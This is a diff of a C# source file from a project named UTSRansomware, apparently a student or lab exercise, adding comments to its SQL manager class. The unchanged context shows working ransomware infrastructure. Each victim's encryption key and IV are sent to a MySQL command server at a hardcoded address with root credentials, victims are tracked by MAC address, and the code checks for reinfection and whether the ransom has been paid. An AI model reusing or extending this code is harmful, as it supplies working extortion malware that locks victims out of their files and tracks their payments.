@@ -8,6 +8,7 @@ using System.Net.NetworkInformation;
 
 namespace UTSRansomware
 {
+    // Static class to manage SQL functionality
     internal static class SQLManager
 {
         private static string connectionString = "Server=192.168.50.126;Database=ransomware;User ID=root;Password=1234;";
@@ -17,6 +18,7 @@ namespace UTSRansomware
             return new MySqlConnection(connectionString);
         }
 
+        // Adds a computer to SQL table
         public static void AddComputer(byte[] key, byte[] iv)
         {
             string convertedKey = Convert.ToBase64String(key);
@@ -39,6 +41,11 @@ namespace UTSRansomware
             }
         }
 
+        /*
+         * Checks if a computer is already infected
+         * Checked on program startup in the case of someone 
+         * killing ransomware process or restarting computer
+        */
         public static bool ComputerInfected()
         {
             using (MySqlConnection connection = new MySqlConnection(connectionString))
@@ -58,6 +65,7 @@ namespace UTSRansomware
             }
         }
 
+        // Removes a computer from SQL DB
         public static void RemoveComputer()
         {
             using (MySqlConnection connection = new MySqlConnection(connectionString))
@@ -75,13 +83,14 @@ namespace UTSRansomware
             }
         }
 
+        // Gets MAC address for computer, used as primary key in SQL DB
         public static string GetMACAddress()
         {
+            // Loop over all installed NIC
             foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
             {
-                // Only consider Ethernet network interfaces, thereby skipping loopback, tunnel, etc.
-                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
-                    nic.OperationalStatus == OperationalStatus.Up)
+                // Only use Ethernet NIC ignore Loopback etc
+                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet && nic.OperationalStatus == OperationalStatus.Up)
                 {
                     string MACAddress = nic.GetPhysicalAddress().ToString();
                     Console.WriteLine($"Got MAC Address: {MACAddress}");
@@ -91,13 +100,13 @@ namespace UTSRansomware
             return String.Empty;
         }
 
+        // Checks SQL server to see if ransom has been paid for current computer
         public static bool IsRansomPaid()
         {
             using (MySqlConnection connection = new MySqlConnection(connectionString))
             {
                 connection.Open();
 
-                // Define the query
                 string query = "SELECT ransom_payed FROM infected_computers WHERE computer_id = @computerId";
                 using (MySqlCommand cmd = new MySqlCommand(query, connection))
                 {
